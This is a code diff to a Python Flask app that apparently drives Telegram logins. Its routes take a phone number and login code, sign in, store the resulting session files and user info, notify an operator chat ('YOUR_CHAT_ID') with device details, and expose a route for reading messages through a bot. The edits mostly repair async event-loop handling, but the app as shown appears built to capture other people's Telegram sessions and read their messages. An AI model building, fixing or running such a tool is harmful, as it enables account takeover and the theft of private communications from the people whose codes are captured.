@@ -33,15 +33,27 @@ print(f"📁 Sessions directory exists: {SESSIONS_DIR.exists()}")
 
 # Thread-safe async runner
 def run_async(coro):
-    """Run async code safely from sync context"""
+    """Run async code safely from sync context - single loop only"""
     try:
+        # Try to get existing loop
         loop = asyncio.get_running_loop()
+        # If we're already in async context, we need to create new loop in thread
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(asyncio.run, coro)
+            return future.result()
     except RuntimeError:
-        # No running loop, create one
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
-    return loop.run_until_complete(coro)
+        # No running loop, create one and run
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_closed():
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        
+        return loop.run_until_complete(coro)
 
 def load_existing_sessions():
     """Load sessions - tries old method first, then new method"""
@@ -726,6 +738,7 @@ def send_code():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
+
 @app.route('/verify-code', methods=['POST'])
 def verify_code():
     try:
@@ -742,8 +755,23 @@ def verify_code():
         phone_code_hash = session_data['phone_code_hash']
         device_model = session_data.get('device_model', 'Unknown')
         
+        # Get or create event loop properly
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_closed():
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        
         async def complete_login():
             try:
+                # Ensure client is using the same loop
+                if client.is_connected:
+                    await client.disconnect()
+                
+                await client.connect()
                 await client.sign_in(
                     phone_number=phone,
                     phone_code_hash=phone_code_hash,
@@ -761,11 +789,13 @@ def verify_code():
                 
                 # Save user info to metadata file
                 json_file = SESSIONS_DIR / f"{session_id}.json"
-                with open(json_file, 'r') as f:
-                    metadata = json.load(f)
-                metadata['user_info'] = session_data['user_info']
-                with open(json_file, 'w') as f:
-                    json.dump(metadata, f)
+                if json_file.exists():
+                    import json
+                    with open(json_file, 'r') as f:
+                        metadata = json.load(f)
+                    metadata['user_info'] = session_data['user_info']
+                    with open(json_file, 'w') as f:
+                        json.dump(metadata, f)
                 
                 # Notify via bot with device info
                 send_telegram_message(YOUR_CHAT_ID,
@@ -790,14 +820,21 @@ def verify_code():
                 }
                 
             except Exception as e:
+                print(f"Login error: {e}")
                 return {'success': False, 'error': str(e)}
         
-        result = run_async(complete_login())
-        return jsonify(result)
+        # Run with proper error handling
+        try:
+            result = loop.run_until_complete(complete_login())
+            return jsonify(result)
+        except Exception as e:
+            print(f"Loop error: {e}")
+            return jsonify({'success': False, 'error': f'Event loop error: {str(e)}'}), 500
         
     except Exception as e:
+        print(f"Verify code error: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
-
+        
 @app.route('/bot-read-messages', methods=['GET'])
 def bot_read_messages():
     try:
